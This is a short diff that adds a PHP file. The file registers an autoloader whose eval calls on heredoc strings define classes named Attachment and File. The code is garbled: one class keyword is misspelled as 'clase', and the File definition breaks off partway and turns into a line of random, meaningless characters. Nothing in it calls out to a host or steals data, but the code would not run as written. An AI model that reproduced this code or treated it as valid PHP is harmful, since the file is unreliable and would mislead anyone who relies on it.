@@ -1,0 +1,14 @@
+<?php
+
+spl_autoload_register(function ($class) { switch ($class) {
+    case "Attachment":
+        eval(<<<'PHP'
+clase {
+}
+PHP
+    ); break;
+    case "File": eval(<<<'PHP'
+class File {
+    use TDatabaseObject {
+        TDatabaseObject::__construct as private databaseObjectConstruct;
+				{				gkctpf	bygbitkq	\]anlkvihev#*	|				|{YQJ				!:								ezdeq?				dbzf	!XAfmceehaMftcag)@								amfp"@?@!GIM(llbhx	YCeofeeybIekdfg	}				gtfxtb	doudhthp	[`ewwppuias)&	|				~{URH				'=								dmbdy=				~				lbolly	VKRB?{&>pcn	Dpoebukcjh*)(!>deoh	!hhch$>:<
